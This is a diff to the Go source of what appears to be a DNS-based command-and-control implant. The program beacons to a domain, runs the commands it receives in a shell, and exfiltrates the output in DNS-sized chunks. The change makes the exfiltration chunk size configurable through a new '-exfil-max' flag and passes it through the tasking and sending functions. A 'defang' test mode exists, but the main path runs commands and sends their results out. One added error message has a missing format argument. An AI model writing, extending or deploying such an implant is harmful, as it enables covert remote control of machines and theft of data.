@@ -26,8 +26,8 @@ import (
 )
 
 const (
-	// EXFILSIZE is the number of bytes to exfil at once
-	EXFILSIZE = 31
+	// MAXEXFIL is the maximum number of bytes we'll exfil per request
+	MAXEXFIL = 31
 
 	// RIDLEN is the length of the random ID
 	RIDLEN = 4
@@ -89,6 +89,11 @@ func main() {
 			"Don't actually run commands, send back random "+
 				"characters",
 		)
+		exfilLen = flag.Int(
+			"exfil-max",
+			31,
+			"Send at most `N` payload bytes per request",
+		)
 	)
 	flag.Usage = func() {
 		fmt.Fprintf(
@@ -118,6 +123,24 @@ Options:
 		os.Exit(1)
 	}
 
+	/* Make sure we don't send too many or too few bytes at once */
+	if 0 >= *exfilLen {
+		fmt.Fprintf(
+			os.Stderr,
+			"Must send at least one byte per request "+
+				"(-exfil-max)\n",
+		)
+		os.Exit(2)
+	}
+	if MAXEXFIL < *exfilLen {
+		fmt.Fprintf(
+			os.Stderr,
+			"Cannot send more than %v bytes per request "+
+				"(-exfil-max)\n",
+		)
+		os.Exit(3)
+	}
+
 	/* Print the ID we're using.  In the case of a random ID, this is not
 	predictable. */
 	log.Printf("ID: %v", *id)
@@ -129,7 +152,14 @@ Options:
 		/* If we have it, do it and send the output back, don't sleep
 		so long next time */
 		if "" != tasking {
-			doTasking(tasking, *id, *domain, *cTimeout, *defang)
+			doTasking(
+				tasking,
+				*id,
+				*domain,
+				*cTimeout,
+				*defang,
+				*exfilLen,
+			)
 			st = *bMin
 		}
 		/* Sleep before next beacon */
@@ -234,10 +264,17 @@ func getTasking(id, domain string) string {
 
 /* doTasking runs the tasking in a shell and returns the output over DNS.  If
 defang is true and task is a number, that many random characters will be sent
-instead of running a command. */
-func doTasking(task, id, domain string, to time.Duration, defang bool) {
+instead of running a command.  exfilLen bytes will be sent at once. */
+func doTasking(
+	task string,
+	id string,
+	domain string,
+	to time.Duration,
+	defang bool,
+	exfilLen int,
+) {
 	if defang {
-		sendRandomChars(task, id, domain)
+		sendRandomChars(task, id, domain, exfilLen)
 		return
 	}
 
@@ -282,18 +319,18 @@ func doTasking(task, id, domain string, to time.Duration, defang bool) {
 	}
 
 	/* Send it back in 31-byte chunks */
-	sendBytes(o, id, domain)
+	sendBytes(o, id, domain, exfilLen)
 }
 
-/* sendBytes sends off the contents of b */
-func sendBytes(o []byte, id, domain string) {
+/* sendBytes sends off the contents of b in exfilLen-size chunks */
+func sendBytes(o []byte, id, domain string, exfilLen int) {
 	var (
 		start int
 		end   int
 	)
-	for start = 0; start < len(o); start += EXFILSIZE {
+	for start = 0; start < len(o); start += exfilLen {
 		/* Work out end index */
-		end = start + EXFILSIZE
+		end = start + exfilLen
 		if end > len(o) {
 			end = len(o)
 		}
@@ -316,8 +353,9 @@ func sendBytes(o []byte, id, domain string) {
 }
 
 /* sendRandomChars sends random characters to the server.  The number of
-characters is controlled by putting a number in count. */
-func sendRandomChars(count, id, domain string) {
+characters is controlled by putting a number in count.  exfilLen bytes will
+be sent at once. */
+func sendRandomChars(count, id, domain string, exfilLen int) {
 	/* Try to get a number */
 	n, err := strconv.Atoi(count)
 	if nil != err {
@@ -325,7 +363,7 @@ func sendRandomChars(count, id, domain string) {
 		if !strings.HasSuffix(s, "\n") {
 			s += "\n"
 		}
-		sendBytes([]byte(s), id, domain)
+		sendBytes([]byte(s), id, domain, exfilLen)
 		return
 	}
 
@@ -338,7 +376,7 @@ func sendRandomChars(count, id, domain string) {
 		cs = append(cs, '\n')
 	}
 
-	sendBytes(cs, id, domain)
+	sendBytes(cs, id, domain, exfilLen)
 }
 
 /* addJitter returns d varied by j, which must be a fraction between 0 and
